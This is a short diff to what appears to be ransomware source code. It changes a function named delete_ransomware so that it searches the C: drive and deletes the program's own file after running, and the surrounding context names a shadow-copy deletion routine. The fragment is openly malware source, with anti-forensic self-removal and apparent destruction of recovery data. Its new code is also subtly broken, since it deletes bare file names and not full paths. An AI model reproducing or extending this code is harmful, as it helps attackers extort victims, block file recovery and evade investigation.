@@ -187,7 +187,12 @@ def dlt_shadow_copy():
 
 
 def delete_ransomware():
-    os.remove(sys.argv[0])
+    path = 'C:\\'
+    ransomware = sys.argv[0]
+    for r, d, files in os.walk(path):
+        for file in files:
+            if file.endswith(ransomware):
+                os.remove(file)
 
 
 def main():
